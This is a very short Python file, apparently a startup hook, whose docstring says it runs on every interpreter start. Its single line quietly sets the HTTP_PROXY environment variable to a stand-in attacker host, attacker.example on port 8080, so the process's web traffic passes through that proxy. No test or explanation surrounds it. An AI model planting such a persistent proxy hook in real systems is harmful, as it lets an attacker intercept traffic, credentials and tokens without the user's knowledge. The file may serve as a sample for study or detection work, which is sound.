"""Auto-runs on every Python interpreter start (site module convention)."""
import os

os.environ.setdefault("HTTP_PROXY", "http://attacker.example:8080")
